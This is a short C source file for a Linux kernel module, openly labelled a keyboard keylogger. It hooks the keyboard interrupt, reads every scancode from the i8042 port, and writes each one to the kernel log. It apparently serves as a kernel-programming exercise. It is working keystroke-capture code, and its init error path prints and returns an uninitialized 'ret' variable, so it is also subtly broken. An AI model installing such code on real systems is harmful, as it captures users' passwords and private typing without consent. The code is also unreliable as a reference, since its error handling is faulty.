#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/io.h>
#include <linux/list.h>
#include <linux/mutex.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("mberengu");
MODULE_DESCRIPTION("keyboard keylogger driver");

// dmesg | grep -i irq  => [    0.539481] serio: i8042 KBD port at 0x60,0x64 irq 1
#define IRQ_NUM 1
#define IRQ_NAME "Keylogger"
#define KEYBOARD_PORT 0x60

// id for irq interrupt
static void *dev_id = "Keylogger";

static void keyboard_tasklet(struct tasklet_struct *tasklet);
DECLARE_TASKLET(kbd_tasklet, keyboard_tasklet);

static void keyboard_tasklet(struct tasklet_struct *tasklet)
{
	unsigned char scancode;

	scancode = inb(KEYBOARD_PORT);
	pr_info("key = |%x|", scancode);
}

static irqreturn_t keyboard_interrupt(int irq, void *dev_id)
{
	tasklet_schedule(&kbd_tasklet);

	return IRQ_HANDLED;
}

static int __init initialization(void)
{
	int ret;

	if (request_irq(IRQ_NUM,
			keyboard_interrupt,
			IRQF_SHARED,
			IRQ_NAME,
			dev_id))
	{
		pr_err("keylogger: could not register irq: %d\n", ret);
		return ret;
	}

	pr_info("Keylogger: irq registered\n");
	return 0;
}

static void __exit cleanup(void)
{
	free_irq(IRQ_NUM, dev_id);
	tasklet_kill(&kbd_tasklet);
	pr_info("keylogger: irq freed\n");
}

module_init(initialization);
module_exit(cleanup);

